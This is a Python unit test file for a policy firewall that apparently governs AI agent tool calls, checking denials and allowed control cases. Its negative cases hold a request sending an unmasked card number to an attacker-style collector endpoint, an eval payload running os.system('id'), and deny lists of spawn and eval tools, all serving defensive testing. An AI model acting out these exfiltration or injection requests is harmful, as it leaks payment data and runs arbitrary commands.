"""Enterprise negative-provenance vectors TC-PROV-001 .. TC-PROV-005 (policy loaded with signature enforcement ON)."""
import unittest

from detgov import DetGovRouter, Firewall, GovernanceViolation
from tests.fixtures import GOOD_HASH, ISRC, PK_HEX, write_policy


class Provenance(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.policy_path = write_policy()
        cls.router = DetGovRouter(cls.policy_path, public_key_hex=PK_HEX, enforce_sig=True)

    def deny(self, tool, params, code):
        for _ in range(3):                                  # deterministic: identical verdict on every evaluation
            allowed, got, why = self.router.evaluate_request(tool, params)
            self.assertEqual((allowed, got), (False, code), why)
        fw = Firewall(self.router)
        with self.assertRaises(GovernanceViolation) as cm:
            fw.execute(tool, params)
        self.assertEqual(cm.exception.code, code)
        return cm.exception

    def test_tc_prov_001_revoked_active_directory_account_denied_IC(self):
        e = self.deny("directory.lookup", {"account": "ACC-REVOKED-9821", "op": "read"}, "DG-C-002")
        self.assertEqual(e.invariant, "I_C")
        self.assertNotIn("ACC-REVOKED", str(e))             # rationale does not echo the identifier

    def test_tc_prov_002_unmasked_pan_to_unapproved_endpoint_denied_IB(self):
        params = {"endpoint": "https://collector.attacker.example/ingest", "event": {"card": "4111 1111 1111 1111", "amount": 10}}
        e = self.deny("telemetry.send", params, "DG-B-003")
        self.assertEqual(e.invariant, "I_B")
        self.assertNotIn("4111", str(e))

    def test_tc_prov_003_synthetic_media_metadata_collision_or_invalid_isrc_denied_IC(self):
        e = self.deny("media.register", {"metadata": {"isrc": "NOT-AN-ISRC", "title": "x"}}, "DG-C-003")
        self.assertEqual(e.invariant, "I_C")
        e = self.deny("media.register", {"metadata": {"isrc": ISRC, "content_hash": "0" * 64}}, "DG-C-004")      # registered ISRC, different media
        self.assertEqual(e.invariant, "I_C")

    def test_tc_prov_004_process_fork_spawn_denied_IG(self):
        for tool in ("os.fork", "subprocess.run", "process.spawn"):
            self.assertEqual(self.deny(tool, {"argv": ["ls"]}, "DG-G-002").invariant, "I_G")

    def test_tc_prov_005_dynamic_code_compilation_eval_denied_IR(self):
        for tool in ("eval", "compile", "python.exec"):
            self.assertEqual(self.deny(tool, {"source": "__import__('os').system('id')"}, "DG-R-001").invariant, "I_R")

    def test_control_cases_are_allowed(self):
        ok = [("directory.lookup", {"account": "ACC-ACTIVE-1"}),
              ("telemetry.send", {"endpoint": "https://telemetry.corp.example/in", "event": {"card": "4111********1111"}}),
              ("media.register", {"metadata": {"isrc": ISRC, "content_hash": GOOD_HASH}}),
              ("media.register", {"metadata": {"isrc": "GBAYE0601498", "content_hash": "ab" * 32}})]
        for tool, params in ok:
            self.assertEqual(self.router.evaluate_request(tool, params), (True, "", "allowed"), (tool, params))


if __name__ == "__main__":
    unittest.main()
